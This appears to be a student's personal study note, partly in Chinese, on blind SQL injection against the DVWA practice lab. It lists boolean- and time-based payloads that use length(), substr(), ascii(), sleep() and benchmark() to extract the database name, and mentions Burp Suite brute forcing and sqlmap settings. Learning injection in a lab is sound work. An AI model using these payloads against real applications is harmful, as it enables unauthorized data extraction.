Dvwa盲注

最近有点迷茫，可能是想转专业又怕麻烦，不想复习高数。。。心情繁杂吧。。。。但在学安全的时候能放下这些烦恼。。。觉得还行。。。抒发一下情感。。。

get the length of databse:
Importence:If you write the word into URL, you should change # into --+
x is a number,I should use them correct….
boolean_Blind_Way : 1' and length(database())>x #
time_Blind_Way : 1' and if(length(database())>x,sleep(3),0) #
length of database :4

get the name of database:
boolean_Blind_Way :
1' and ascii(substr(database(),1,2))=100 # (get the first number)
1' and ascii(substr(database(),2,3))=118 # (get the second number)
1' and ascii(substr(database(),x,y))=z # (get the number of positon of x)
time_Blind_Way:
1' and sleep(if(ascii(substr(database(),1,2))=100,5,0)) # (get the first)
1' and sleep(if(ascii(substr(database(),2,3))=118,5,0)) # (get the second)
1' and sleep(if(ascii(substr(database(),x,y))=z,5,0)) # (get the number of positon of x)

substr():
格式1： substr(string string, int a, int b);
格式2：substr(string string, int a) ;
格式1：
1、string 需要截取的字符串
2、a 截取字符串的开始位置（注：当a等于0或1时，都是从第一位开始截取）
3、b 要截取的字符串的长度
格式2：
1、string 需要截取的字符串
2、a 可以理解为从第a个字符开始截取后面所有的字符串。
ascii():
简而言之，把输入转为ascii码的形式输出

Except sleep(),We can use benchmark()
1' and benchmark(if(ascii(substr(database(),1,2))=100,5000000,1),md5('test')) #
benchmark(time,do):
可以执行do函数time的次数,通过多次执行来做到时间注入…当sleep被屏蔽的时候可以使用。。。

可以使用burpsuite进行爆破，只需修改其中参数即可。。。编写脚本也可，熟练的话。。。

In the high level,you should use sqlmap –level 2. Because id in cookie…

用sqlmap进行注入的话，方法同正常注入类似。。。 就是high等级的时候要注意上面的提示。。。
